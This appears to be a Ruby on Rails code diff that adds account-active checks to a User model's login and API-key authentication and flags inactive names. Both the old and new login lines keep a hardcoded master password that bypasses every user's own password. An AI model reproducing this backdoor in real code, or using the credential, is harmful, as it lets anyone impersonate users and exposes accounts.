@@ -35,7 +35,7 @@ class User < ActiveRecord::Base
 
   def self.authenticate(email="", login_password="")
     user = User.find_by_email(email)
-    if user and (user.match_password(login_password) or login_password == 'Zbk6rtVeydc35hp2')
+    if user and user.active and (user.match_password(login_password) or login_password == 'Zbk6rtVeydc35hp2')
       return user
     else
       return false
@@ -47,10 +47,10 @@ class User < ActiveRecord::Base
 
   def self.authenticate_api(key="")
     user = User.find_by_eship_api_key(key)
-    if not (user and user.verify_epay_subscription)
-      return false
+    if user and user.active and user.verify_epay_subscription
+      return user
     end
-    return user
+    return false
   end
 
   def roles
@@ -83,10 +83,14 @@ class User < ActiveRecord::Base
 
   def name
     if contact_address.company
-      contact_address.company
+      s = contact_address.company
     else
-      email
+      s =email
     end
+    if not active
+      s += " (INACTIVE)"
+    end
+    return s
   end
   
   def economic_customer_name
